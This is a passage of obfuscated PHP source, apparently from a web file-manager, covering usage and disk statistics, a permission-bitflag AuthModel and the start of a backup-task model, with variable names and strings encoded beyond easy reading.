array($š×¹ÒºÕ[238] => $Ïó±Ä¹Ÿ); foreach ($êØÂ¡ó¤[$‹ĞÕ–ç] as $ã‘Øóà => $©—ôû©¯) { $ƒÊæó[$ã‘Øóà] = 0; } $èØ‰à¬[] = $ƒÊæó; } $¿ÇÃé™ä = array(); foreach ($èØ‰à¬ as $©—ôû©¯) { if ($‹ĞÕ–ç == $š×¹ÒºÕ[1802] && $©—ôû©¯[$š×¹ÒºÕ[1804]] > $©—ôû©¯[$š×¹ÒºÕ[788]]) { $©—ôû©¯[$š×¹ÒºÕ[1804]] = $©—ôû©¯[$š×¹ÒºÕ[788]]; } foreach ($êØÂ¡ó¤[$‹ĞÕ–ç] as $ã‘Øóà => $µã«Î™ƒ) { $ÊÀª„ŠŒ = array($š×¹ÒºÕ[238] => $©—ôû©¯[$š×¹ÒºÕ[238]], $š×¹ÒºÕ[1573] => $µã«Î™ƒ); $ÊÀª„ŠŒ[$‰ÑÙ“ÅÖ[$‹ĞÕ–ç]] = isset($©—ôû©¯[$ã‘Øóà]) ? $©—ôû©¯[$ã‘Øóà] : 0; $¿ÇÃé™ä[] = $ÊÀª„ŠŒ; } } return $¿ÇÃé™ä; } public function validDate($şî©®, $üÏÛé§Ê) { $ÒÑ«®õ÷ =& $_SERVER[™»È’øè]; $ÑÕŠºÇ– = date($ÒÑ«®õ÷[1807], strtotime($ÒÑ«®õ÷[1808])); $ÙÅÃš‡ = array($ÑÕŠºÇ–); switch ($şî©®) { case $ÒÑ«®õ÷[1658]: $ú»œ÷¡Â = mktime(0, 0, 0, date($ÒÑ«®õ÷[1824]), date($ÒÑ«®õ÷[1389]) - date($ÒÑ«®õ÷[1452]) + 7 - 7, date($ÒÑ«®õ÷[1825])); $ò˜š£‚ = 0; do { $¡­¤ôê¯ = date($ÒÑ«®õ÷[1807], $ú»œ÷¡Â - 3600 * 24 * 7 * $ò˜š£‚); $ÙÅÃš‡[] = $¡­¤ôê¯; $ò˜š£‚++; } while ($üÏÛé§Ê < $¡­¤ôê¯); break; case $ÒÑ«®õ÷[1656]: $ò˜š£‚ = 1; do { $ıÖ¿Ú‘İ = date($ÒÑ«®õ÷[1826], strtotime("\x2d\40{$ò˜š£‚}\40\155\157\x6e\164\150\163")); $ÙÅÃš‡[] = $ıÖ¿Ú‘İ; $ò˜š£‚++; } while ($üÏÛé§Ê < $ıÖ¿Ú‘İ); break; case $ÒÑ«®õ÷[1827]: $Ë»¥îÎ¿ = (int) date($ÒÑ«®õ÷[1825], strtotime($üÏÛé§Ê)); $ë¡¶œ… = (int) date($ÒÑ«®õ÷[1825]); if ($Ë»¥îÎ¿ >= $ë¡¶œ…) { break; } for ($Ë»¥îÎ¿; $Ë»¥îÎ¿ < $ë¡¶œ…; $Ë»¥îÎ¿++) { $ÙÅÃš‡[] = $Ë»¥îÎ¿ . $ÒÑ«®õ÷[1828]; } break; default: break; } if ($üÏÛé§Ê > end($ÙÅÃš‡)) { array_pop($ÙÅÃš‡); } sort($ÙÅÃš‡); return $ÙÅÃš‡; } public function listTable($ÂêÌÛ½µ) { $ô­¶ç„Ì = ucfirst($ÂêÌÛ½µ); return Model($ô­¶ç„Ì)->listData(); } public function option($ØİÂùîÉ) { $£ıñÜùÂ = $_SERVER[™»È’øè][1829] . ucfirst($ØİÂùîÉ); return $this->{$£ıñÜùÂ}(); } private function optionUser() { $£Î€êÙê =& $_SERVER[™»È’øè]; $°Â³¤ôé = Model($£Î€êÙê[566])->count($£Î€êÙê[1678]); $ºš¯¶–Ê = Model($£Î€êÙê[566])->where($£Î€êÙê[1830])->count($£Î€êÙê[1678]); $•Ó–·Ú› = intval($GLOBALS[$£Î€êÙê[6]][$£Î€êÙê[392]][$£Î€êÙê[1630]]) / 3600; $ØïáÁ¹ = strtotime("\x2d{$•Ó–·Ú›}\40\150\x6f\x75\x72\x73"); $Óƒ´¤˜í = strtotime(date($£Î€êÙê[1811])); if ($ØïáÁ¹ < $Óƒ´¤˜í) { $ØïáÁ¹ = $Óƒ´¤˜í; } $ÁıËèÅ = array($£Î€êÙê[1831] => array($£Î€êÙê[1044], $ØïáÁ¹)); $ßØá“ãÂ = (int) Model($£Î€êÙê[566])->where($ÁıËèÅ)->count($£Î€êÙê[1678]); if (!$ßØá“ãÂ) { $ßØá“ãÂ = 1; } $ÁıËèÅ = array($£Î€êÙê[1831] => array($£Î€êÙê[1044], $Óƒ´¤˜í)); $¹Ğ¼ïş = Model($£Î€êÙê[566])->where($ÁıËèÅ)->count($£Î€êÙê[1678]); return array($£Î€êÙê[783] => (int) $°Â³¤ôé, $£Î€êÙê[1832] => (int) ($°Â³¤ôé - $ºš¯¶–Ê), $£Î€êÙê[1833] => (int) $ºš¯¶–Ê, $£Î€êÙê[1834] => (int) $¹Ğ¼ïş, $£Î€êÙê[1835] => $ßØá“ãÂ); } private function optionFile() { $œ°Í¿ÊÕ =& $_SERVER[™»È’øè]; $·Áô·ú¯ = $this->sourceSize(); $„°ÍËÜÛ = $·Áô·ú¯[$œ°Í¿ÊÕ[76]]; $—Î³µĞâ = $·Áô·ú¯[$œ°Í¿ÊÕ[1804]]; $×¦ğÁî = Model($œ°Í¿ÊÕ[850])->where(array($œ°Í¿ÊÕ[452] => 0))->count($œ°Í¿ÊÕ[180]); $Û“Ş¡øò = array($œ°Í¿ÊÕ[452] => 0, $œ°Í¿ÊÕ[214] => array($œ°Í¿ÊÕ[1044], strtotime(date($œ°Í¿ÊÕ[1811])))); $ Î¬ø½õ = Model($œ°Í¿ÊÕ[850])->where($Û“Ş¡øò)->sum($œ°Í¿ÊÕ[76]); $æíŠ = Model($œ°Í¿ÊÕ[850])->where($Û“Ş¡øò)->count($œ°Í¿ÊÕ[180]); return array($œ°Í¿ÊÕ[788] => $„°ÍËÜÛ, $œ°Í¿ÊÕ[1804] => $—Î³µĞâ, $œ°Í¿ÊÕ[1836] => $„°ÍËÜÛ - $—Î³µĞâ, $œ°Í¿ÊÕ[1837] => (int) $ Î¬ø½õ, $œ°Í¿ÊÕ[790] => (int) $×¦ğÁî, $œ°Í¿ÊÕ[1838] => (int) $æíŠ); } private function optionAccess() { $ªÀØÓÌ =& $_SERVER[™»È’øè]; return array($ªÀØÓÌ[783] => $this->typeLogCnt(), $ªÀØÓÌ[107] => $this->typeLogCnt($ªÀØÓÌ[107]), $ªÀØÓÌ[492] => $this->typeLogCnt($ªÀØÓÌ[492]), $ªÀØÓÌ[1839] => $this->typeLogCnt($ªÀØÓÌ[1839]), $ªÀØÓÌ[1840] => $this->typeLogCnt($ªÀØÓÌ[1840]), $ªÀØÓÌ[629] => $this->typeLogCnt($ªÀØÓÌ[12], $ªÀØÓÌ[1815])); } private function typeLogCnt($å’øû™ = '', $Í•åšä÷ = "\x69\144") { $ì¡ÂˆûÅ =& $_SERVER[™»È’øè]; $ÂÚ¢£õ = array($ì¡ÂˆûÅ[107] => array($ì¡ÂˆûÅ[1841], $ì¡ÂˆûÅ[1842]), $ì¡ÂˆûÅ[492] => array($ì¡ÂˆûÅ[1843], $ì¡ÂˆûÅ[1844]), $ì¡ÂˆûÅ[1839] => array($ì¡ÂˆûÅ[1845], $ì¡ÂˆûÅ[1846], $ì¡ÂˆûÅ[1847]), $ì¡ÂˆûÅ[1840] => array($ì¡ÂˆûÅ[1848], $ì¡ÂˆûÅ[1849]), $ì¡ÂˆûÅ[1850] => array($ì¡ÂˆûÅ[1851], $ì¡ÂˆûÅ[1852], $ì¡ÂˆûÅ[1853])); $‘›èƒ× = strtotime(date($ì¡ÂˆûÅ[1811])); $·ƒÎ‚¼ = array($ì¡ÂˆûÅ[214] => array($ì¡ÂˆûÅ[1044], $‘›èƒ×)); if ($å’øû™) { $·ƒÎ‚¼[$ì¡ÂˆûÅ[33]] = array($ì¡ÂˆûÅ[7], $ÂÚ¢£õ[$å’øû™]); } $©ÑÒùÏÁ = Model($ì¡ÂˆûÅ[1814])->where($·ƒÎ‚¼)->count($Í•åšä÷); return (int) $©ÑÒùÏÁ; } private function optionServer() { $É‡şÌ¯ú =& $_SERVER[™»È’øè]; $ÌçğÚËü = $this->diskDriver(); $¯ÅôùÙ„ = KodIO::defaultDriver(); $ıˆ˜²¿ = array($É‡şÌ¯ú[842] => $¯ÅôùÙ„[$É‡şÌ¯ú[442]]); $İÉÊÜÀø = Model($É‡şÌ¯ú[511])->where($ıˆ˜²¿)->sum($É‡şÌ¯ú[76]); $ßğÂªËÓ = explode($É‡şÌ¯ú[53], $_SERVER[$É‡şÌ¯ú[143]]); $®ÑÕ = $ßğÂªËÓ[0]; $¹Àïá–å = $GLOBALS[$É‡şÌ¯ú[6]][$É‡şÌ¯ú[21]]; $¼åƒÖÌê = $¹Àïá–å[$É‡şÌ¯ú[1006]]; if ($¼åƒÖÌê == $É‡şÌ¯ú[994]) { $ˆ’ó¤˜ = explode($É‡şÌ¯ú[1312], $¹Àïá–å[$É‡şÌ¯ú[1005]]); $¼åƒÖÌê = $ˆ’ó¤˜[0]; } if ($¼åƒÖÌê == $É‡şÌ¯ú[942] || $¼åƒÖÌê == $É‡şÌ¯ú[829]) { $ƒµ“™›£ = Model()->db()->query($É‡şÌ¯ú[1854]); $ŞĞÅò£™ = $ƒµ“™›£[0] && isset($ƒµ“™›£[0][$É‡şÌ¯ú[1572]]) ? $ƒµ“™›£[0][$É‡şÌ¯ú[1572]] : 0; $¼åƒÖÌê = $É‡şÌ¯ú[1855] . ($ŞĞÅò£™ ? $É‡şÌ¯ú[8] . $ŞĞÅò£™ : $É‡şÌ¯ú[12]); } $ÒÆè‘Õ˜ = $GLOBALS[$É‡şÌ¯ú[6]][$É‡şÌ¯ú[392]][$É‡şÌ¯ú[852]]; return array($É‡şÌ¯ú[1856] => $ÌçğÚËü ? $ÌçğÚËü[$É‡şÌ¯ú[1857]] : 0, $É‡şÌ¯ú[1858] => $ÌçğÚËü ? $ÌçğÚËü[$É‡şÌ¯ú[1859]] : 0, $É‡şÌ¯ú[1860] => (int) $¯ÅôùÙ„[$É‡şÌ¯ú[1857]] * 1024 * 1024 * 1024, $É‡şÌ¯ú[1861] => (int) $İÉÊÜÀø, $É‡şÌ¯ú[1862] => ucfirst($®ÑÕ), $É‡şÌ¯ú[1863] => $É‡şÌ¯ú[1864] . PHP_VERSION, $É‡şÌ¯ú[1865] => phpBuild64() ? 64 : 32, $É‡şÌ¯ú[782] => str_replace($É‡şÌ¯ú[1160], $É‡şÌ¯ú[1022], $¼åƒÖÌê), $É‡şÌ¯ú[392] => ucfirst($ÒÆè‘Õ˜), $É‡şÌ¯ú[32] => $_SERVER[$É‡şÌ¯ú[1866]]); } private function diskDriver() { $ä›ıôÍ =& $_SERVER[™»È’øè]; $™Åµ×Í§ = $ä›ıôÍ[8]; $‡¼ÃåĞå = $GLOBALS[$ä›ıôÍ[6]][$ä›ıôÍ[1329]] == $ä›ıôÍ[1330]; if ($‡¼ÃåĞå) { $™Åµ×Í§ = $ä›ıôÍ[1867]; if (function_exists($ä›ıôÍ[1868])) { exec($ä›ıôÍ[1869], $Ç¡¢¿²); $™Åµ×Í§ = $Ç¡¢¿²[1] . $ä›ıôÍ[8]; } } if (!file_exists($™Åµ×Í§)) { return; } $ùÖ£µ = @disk_total_space($™Åµ×Í§); $¾ÏÎüÆ = $ùÖ£µ - @disk_free_space($™Åµ×Í§); return array($ä›ıôÍ[1857] => $ùÖ£µ, $ä›ıôÍ[1859] => $¾ÏÎüÆ); } public function fileChart($Ú²†Ìó÷) { $…ê¶øÜ˜ =& $_SERVER[™»È’øè]; if (isset($Ú²†Ìó÷[$…ê¶øÜ˜[1678]])) { return Model($…ê¶øÜ˜[850])->userFileTypeProfile($Ú²†Ìó÷[$…ê¶øÜ˜[1678]]); } if (isset($Ú²†Ìó÷[$…ê¶øÜ˜[1870]])) { return Model($…ê¶øÜ˜[850])->groupFileTypeProfile($Ú²†Ìó÷[$…ê¶øÜ˜[1870]]); } $ßúÂ° = $this->sourceSize(); $µÃğ´¢Ï = array($…ê¶øÜ˜[179] => 0, $…ê¶øÜ˜[177] => 1); $Î‹ÙìÖ = Model($…ê¶øÜ˜[850])->where($µÃğ´¢Ï)->sum($…ê¶øÜ˜[76]); $µÃğ´¢Ï[$…ê¶øÜ˜[177]] = 2; $ë·Ï–¤Ó = Model($…ê¶øÜ˜[850])->where($µÃğ´¢Ï)->sum($…ê¶øÜ˜[76]); return array($…ê¶øÜ˜[788] => $ßúÂ°[$…ê¶øÜ˜[76]], $…ê¶øÜ˜[1804] => $ßúÂ°[$…ê¶øÜ˜[1804]], $…ê¶øÜ˜[1805] => (int) $Î‹ÙìÖ, $…ê¶øÜ˜[1806] => (int) $ë·Ï–¤Ó); } private function sourceSize() { $‹ ¨£¶ì =& $_SERVER[™»È’øè]; $¶»ø¤ã¸ = Model($‹ ¨£¶ì[850])->where(array($‹ ¨£¶ì[452] => 0))->sum($‹ ¨£¶ì[76]); $â´ùÇ½ = Model($‹ ¨£¶ì[511])->sum($‹ ¨£¶ì[76]); if ($â´ùÇ½ > $¶»ø¤ã¸) { $â´ùÇ½ = $¶»ø¤ã¸; } return array($‹ ¨£¶ì[76] => (int) $¶»ø¤ã¸, $‹ ¨£¶ì[1804] => (int) $â´ùÇ½); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $†èİÜ»Š =& $_SERVER[™»È’øè]; $ãÙı¼†Õ = array(array($†èİÜ»Š[461] => LNG($†èİÜ»Š[1871]), $†èİÜ»Š[1872] => $†èİÜ»Š[1873], $†èİÜ»Š[1874] => 1, $†èİÜ»Š[1875] => 1, $†èİÜ»Š[1876] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($†èİÜ»Š[461] => LNG($†èİÜ»Š[1877]), $†èİÜ»Š[1872] => $†èİÜ»Š[1878], $†èİÜ»Š[1874] => 2, $†èİÜ»Š[1875] => 1, $†èİÜ»Š[1876] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($†èİÜ»Š[461] => LNG($†èİÜ»Š[1879]), $†èİÜ»Š[1872] => $†èİÜ»Š[1880], $†èİÜ»Š[1874] => 3, $†èİÜ»Š[1875] => 1, $†èİÜ»Š[1876] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($†èİÜ»Š[461] => LNG($†èİÜ»Š[1881]), $†èİÜ»Š[1872] => $†èİÜ»Š[1882], $†èİÜ»Š[1874] => 4, $†èİÜ»Š[1875] => 1, $†èİÜ»Š[1876] => self::AUTH_SHOW | self::AUTH_VIEW), array($†èİÜ»Š[461] => LNG($†èİÜ»Š[1883]), $†èİÜ»Š[1872] => $†èİÜ»Š[1884], $†èİÜ»Š[1874] => 5, $†èİÜ»Š[1875] => 1, $†èİÜ»Š[1876] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($†èİÜ»Š[461] => LNG($†èİÜ»Š[1885]), $†èİÜ»Š[1872] => $†èİÜ»Š[1886], $†èİÜ»Š[1874] => 6, $†èİÜ»Š[1875] => 1, $†èİÜ»Š[1876] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($†èİÜ»Š[461] => LNG($†èİÜ»Š[1887]), $†èİÜ»Š[1872] => $†èİÜ»Š[1888], $†èİÜ»Š[1874] => 7, $†èİÜ»Š[1875] => 1, $†èİÜ»Š[1876] => 0)); return $ãÙı¼†Õ; } public static function authCheck($Ë«ğƒ», $ôÛÒ™‹ê) { $ƒæƒ¹İÒ =& $_SERVER[™»È’øè]; $Ë«ğƒ» = intval($Ë«ğƒ»); if ($GLOBALS[$ƒæƒ¹İÒ[535]] && $GLOBALS[$ƒæƒ¹İÒ[6]][$ƒæƒ¹İÒ[1889]]) { return !0; } if ($Ë«ğƒ» <= 0) { return !1; } if (($Ë«ğƒ» & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ë«ğƒ» & $ôÛÒ™‹ê); } public static function authCheckShow($ ±´‘Êî) { return self::authCheck($ ±´‘Êî, self::AUTH_SHOW); } public static function authCheckView($öŞÉÍûœ) { return self::authCheck($öŞÉÍûœ, self::AUTH_VIEW); } public static function authCheckDownload($›Ä‡Ëü) { return self::authCheck($›Ä‡Ëü, self::AUTH_DOWNLOAD); } public static function authCheckUpload($•¨ƒ“§) { return self::authCheck($•¨ƒ“§, self::AUTH_UPLOAD); } public static function authCheckEdit($Ä›­—Æ) { return self::authCheck($Ä›­—Æ, self::AUTH_EDIT); } public static function authCheckRemove($ø´ç®ı–) { return self::authCheck($ø´ç®ı–, self::AUTH_REMOVE); } public static function authCheckShare($ìø‘…Ûø) { return self::authCheck($ìø‘…Ûø, self::AUTH_SHARE); } public static function authCheckComment($•ôì´«ê) { return self::authCheck($•ôì´«ê, self::AUTH_COMMENT); } public static function authCheckEvent($Æš‹©­) { return self::authCheck($Æš‹©­, self::AUTH_EVENT); } public static function authCheckRoot($Îî‘¶¬) { return self::authCheck($Îî‘¶¬, self::AUTH_ROOT); } public static function authCheckAction($¯öÎÈœ”, $ğ‡äÑÒ) { $Öëš½» =& $_SERVER[™»È’øè]; $Ü ¢ñéø = array($Öëš½»[1890] => self::AUTH_VIEW, $Öëš½»[1224] => self::AUTH_DOWNLOAD, $Öëš½»[107] => self::AUTH_UPLOAD, $Öëš½»[1840] => self::AUTH_EDIT, $Öëš½»[1839] => self::AUTH_REMOVE, $Öëš½»[1850] => self::AUTH_SHARE, $Öëš½»[397] => self::AUTH_COMMENT, $Öëš½»[1666] => self::AUTH_EVENT, $Öëš½»[1891] => self::AUTH_ROOT); if (!isset($Ü ¢ñéø[$ğ‡äÑÒ])) { return; } $´¡Áñ¿û = $Ü ¢ñéø[$ğ‡äÑÒ]; $¯öÎÈœ” = intval($¯öÎÈœ”); if ($¯öÎÈœ” <= 0) { return !1; } if (($¯öÎÈœ” & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¯öÎÈœ” & $´¡Áñ¿û); } public static function authDisable($Ş©ÓãõÇ, $¸»¶Œ¹Ø) { if (intval($Ş©ÓãõÇ) <= 0) { return 0; } return intval($Ş©ÓãõÇ) & ~$¸»¶Œ¹Ø; } public $optionType = "\x53\171\x73\164\145\x6d\x2e\163\157\165\162\x63\145\101\165\164\x68\x4c\x69\x73\164"; public $field = array("\156\x61\155\145", "\x61\x75\164\x68", "\154\x61\142\x65\x6c", "\144\x69\163\x70\x6c\x61\171", "\163\171\x73\164\x65\155", "\x73\x6f\162\x74"); public function initData() { $¾Õ»ÙÛÄ = $this->authDefault(); foreach ($¾Õ»ÙÛÄ as $ı§ó˜”Í) { $this->add($ı§ó˜”Í); } } public function findAuth($Çİêâ‚Ö, $˜Ô«İé) { $øËÍìù =& $_SERVER[™»È’øè]; $ñğ¢Á¢ = parent::listData(); foreach ($ñğ¢Á¢ as $Òà§ú‡) { $Â°Ÿ–› = intval($Òà§ú‡[$øËÍìù[454]]); if ($Â°Ÿ–› <= 0 || $Òà§ú‡[$øËÍìù[1892]] == 0) { continue; } if (($Â°Ÿ–› & $Çİêâ‚Ö) != $Çİêâ‚Ö) { continue; } if (($Â°Ÿ–› & $˜Ô«İé) != 0) { continue; } return $Òà§ú‡[$øËÍìù[442]]; } return !1; } public function findAuthReadOnly() { $Éª‘Ôú¹ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $±ÇÎã…ğ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Éª‘Ôú¹, $±ÇÎã…ğ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÂÜ÷‘ =& $_SERVER[™»È’øè]; $‚€ˆß§š = parent::listData(); $…³Ùš¾è = !1; foreach ($‚€ˆß§š as $—€ª°«) { if ($—€ª°«[$ÂÜ÷‘[454]] <= 0 || $—€ª°«[$ÂÜ÷‘[1892]] == $ÂÜ÷‘[211]) { continue; } if (!$…³Ùš¾è) { $…³Ùš¾è = $—€ª°«; continue; } if ($…³Ùš¾è[$ÂÜ÷‘[454]] > $—€ª°«[$ÂÜ÷‘[454]]) { $…³Ùš¾è = $—€ª°«; } } return $…³Ùš¾è ? $…³Ùš¾è[$ÂÜ÷‘[442]] : $ÂÜ÷‘[12]; } public function listData($öÕì™™’ = false, $ÒÀº—µê = "\x73\157\162\164", $¯ÇÚÚï„ = false) { return parent::listData($öÕì™™’, $ÒÀº—µê, $¯ÇÚÚï„); } public function update($´Àøöğ¿, $ªÖ´‹§¾) { $ğ¡ûüá— =& $_SERVER[™»È’øè]; $ôÉşïªš = parent::listData($´Àøöğ¿); $Ë›ç©ÚÜ = $this->findByName($ªÖ´‹§¾[$ğ¡ûüá—[32]]); if (!$ôÉşïªš || $Ë›ç©ÚÜ && $Ë›ç©ÚÜ[$ğ¡ûüá—[442]] != $ôÉşïªš[$ğ¡ûüá—[442]]) { return !1; } $this->filterAuth($ªÖ´‹§¾[$ğ¡ûüá—[454]]); return parent::update($´Àøöğ¿, $ªÖ´‹§¾); } public function remove($çû Æô ) { $ÅÄä£–— = parent::listData($çû Æô ); if (!$ÅÄä£–— || $ÅÄä£–—[$_SERVER[™»È’øè][178]]) { return !1; } return parent::remove($çû Æô ); } public function add($Ñåô÷†Ï = array()) { $„šÎÎŸ¢ =& $_SERVER[™»È’øè]; if ($this->findByName($Ñåô÷†Ï[$„šÎÎŸ¢[32]])) { return !1; } $ŠÆõìì¬ = array($„šÎÎŸ¢[32] => $„šÎÎŸ¢[12], $„šÎÎŸ¢[454] => 1, $„šÎÎŸ¢[1893] => $„šÎÎŸ¢[1880], $„šÎÎŸ¢[1892] => 1, $„šÎÎŸ¢[178] => 0, $„šÎÎŸ¢[1894] => 0); $Ñåô÷†Ï = array_merge($ŠÆõìì¬, $Ñåô÷†Ï); $Ñåô÷†Ï[$„šÎÎŸ¢[1894]] = $this->getSort(); $this->filterAuth($Ñåô÷†Ï[$„šÎÎŸ¢[454]]); return parent::insert($Ñåô÷†Ï); } private function getSort() { $¯¾Ï÷÷ï =& $_SERVER[™»È’øè]; $ÉÎ€¶‹² = parent::listData(); $ºşğÌÕå = array_to_keyvalue($ÉÎ€¶‹², $¯¾Ï÷÷ï[12], $¯¾Ï÷÷ï[1894]); return empty($ºşğÌÕå) ? 0 : max($ºşğÌÕå) + 1; } private function filterAuth(&$úŞ—†Î) { if (!$úŞ—†Î) { return; } $Åµ§ªğÀ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÏÎ„ù±Æ = array(); foreach ($Åµ§ªğÀ as $‡«ÛÁîè) { if ($úŞ—†Î & $‡«ÛÁîè) { $ÏÎ„ù±Æ[] = $‡«ÛÁîè; } } if (in_array(self::AUTH_ROOT, $ÏÎ„ù±Æ)) { $úŞ—†Î = array_sum($Åµ§ªğÀ); return; } $ãéñ¡„ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÏÎ„ù±Æ as $‡«ÛÁîè) { if (isset($ãéñ¡„[$‡«ÛÁîè])) { $ÏÎ„ù±Æ = array_merge($ÏÎ„ù±Æ, $ãéñ¡„[$‡«ÛÁîè]); } } $ÏÎ„ù±Æ[] = self::AUTH_SHOW; $úŞ—†Î = array_sum(array_unique($ÏÎ„ù±Æ)); } public function sort($¿å€ÏÓ°, $£ºµÅÜÑ) { return parent::update($¿å€ÏÓ°, $£ºµÅÜÑ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\142\x61\x63\x6b\x75\x70\x4c\151\163\164"; public $field = array("\x69\x6f", "\156\x61\x6d\x65", "\163\x74\x61\164\x75\163", "\x63\157\x6e\x74\x65\156\164", "\x6d\141\x6e\x75\141\x6c", "\162\145\163\x75\x6c\164", "\x74\x69\155\145\x46\x72\x6f\x6d", "\x74\x69\155\x65\x54\157"); public function config() { $ŒÈçá‰˜ =& $_SERVER[™»È’øè]; $®ØŒì¨Ö = Model($ŒÈçá‰˜[795])->get($ŒÈçá‰˜[805]); $®ØŒì¨Ö = json_decode($®ØŒì¨Ö, !0); $®ØŒì¨Ö = is_array($®ØŒì¨Ö) ? $®ØŒì¨Ö : array(); if (!isset($®ØŒì¨Ö[$ŒÈçá‰˜[779]])) { $®ØŒì¨Ö[$ŒÈçá‰˜[779]] = $ŒÈçá‰˜[88]; } unset($®ØŒì¨Ö[$ŒÈçá‰˜[1648]]); Action($ŒÈçá‰˜[1895])->taskInit(); Model($ŒÈçá‰˜[1647])->cacheClear(); $ä‡åêĞ“ = $ŒÈçá‰˜[1896]; $ƒÚÌ´ö¥ = Model($ŒÈçá‰˜[1897])->findByKey($ŒÈçá‰˜[1666], $ä‡åêĞ“); if (!$ƒÚÌ´ö¥) { $ƒÚÌ´ö¥ = array(); } if (isset($ƒÚÌ´ö¥[$ŒÈçá‰˜[193]])) { $ƒÚÌ´ö¥[$ŒÈçá‰˜[193]] = json_decode($ƒÚÌ´ö¥[$ŒÈçá‰˜[193]], !0); } if (isset($®ØŒì¨Ö[$ŒÈçá‰˜[193]])) { $ƒÚÌ´ö¥[$ŒÈçá‰˜[193]][$ŒÈçá‰˜[1651]] = $®ØŒì¨Ö[$ŒÈçá‰˜[193]]; unset($®ØŒì¨Ö[$ŒÈçá‰˜[193]]); } return array_merge($ƒÚÌ´ö¥, $®ØŒì¨Ö); } public function listData($Ç’•“Óº = false, $´ƒ¶Ò¦ = "\x6d\x6f\x64\x69\x66\171\x54\x69\155\145", $””Íğ–ƒ = false) { return parent::listData($Ç’•“Óº, $´ƒ¶Ò¦, !0); } public function lastItem() { $æØ‰·æ€ = $this->listData(); return !empty($æØ‰·æ€[0]) ? $æØ‰·æ€[0] : null; } public function kill($Ã€ì¶¾) { $¯·ùüÅï =& $_SERVER[™»È’øè]; $û«š³Ïï = $this->listData($Ã€ì¶¾); if (!$û«š³Ïï || empty($û«š³Ïï[$¯·ùüÅï[32]])) { return !0; } Task::kill($¯·ùüÅï[804]); Task::kill($¯·ùüÅï[825]); Task::kill($¯·ùüÅï[834]); $÷îÚÔ¹Û = $û«š³Ïï[$¯·ùüÅï[32]]; $Ô¥¨Ô—’ = TEMP_FILES . $¯·ùüÅï[803] . $÷îÚÔ¹Û . $¯·ùüÅï[8]; IO::remove($Ô¥¨Ô—’, !1); return $this->remove($Ã€ì¶¾); } public function remove($ÍÛñ¸ìİ) { $öä’êŒí = $this->listData($ÍÛñ¸ìİ); if (!$öä’êŒí) { return !0; } return $this->backupRemove($öä’êŒí); } private function backupRemove($Ú´êÆô‚) { parent::remove($Ú´êÆô‚[$_SERVER[™»È’øè][442]]); $’Æ¼ñÆ = $this->backupPath($Ú´êÆô‚); IO::remove($’Æ¼ñÆ, !1); return !0; } private function backupPath($ÍÜĞ ø°) { $ßŸÙ²Ò– =& $_SERVER[™»È’øè]; $Áã‘âÆß = $ÍÜĞ ø°[$ßŸÙ²Ò–[32]]; $ï²ÈÂğ = Model($ßŸÙ²Ò–[795])->get($ßŸÙ²Ò–[796]); $ğŠîÓ¨Û = substr(md5($ßŸÙ²Ò–[797] . $ï²ÈÂğ . $Áã‘âÆß), 0, 8); return "\x7b\151\157\72{$ÍÜĞ ø°[$ßŸÙ²Ò–[776]]}\175\x2f\144\141\164\x61\142\141\x73\145\x2f\142\x61\x63\153\165\160\x2f" . $Áã‘âÆß . $ßŸÙ²Ò–[11] . $ğŠîÓ¨Û; } public function start() { $ËßÒÄé =& $_SERVER[™»È’øè]; if ($GLOBALS[$ËßÒÄé[6]][$ËßÒÄé[89]][$ËßÒÄé[1898]] != $ËßÒÄé[88]) { return !0; } $‹Œ˜­ü´ = $this->config(); if (!$‹Œ˜­ü´ || $‹Œ˜­ü´[$ËßÒÄé[1648]] != $ËßÒÄé[88]) { return !1; } $—Í±ï = $this->process(); foreach ($—Í±ï as $Èµ¹†ı¡) { if ($Èµ¹†ı¡) { return Task::restart($Èµ¹†ı¡[$ËßÒÄé[442]]); } } $«Äù¥¤ = new Backup(); $±«“ÒóÎ = $«Äù¥¤->db(); if ($±«“ÒóÎ) { $±«“ÒóÎ = $«Äù¥¤->dbFile(); if ($±«“ÒóÎ && $‹Œ˜­ü´[$ËßÒÄé[779]] == $ËßÒÄé[211]) { $±«“ÒóÎ = 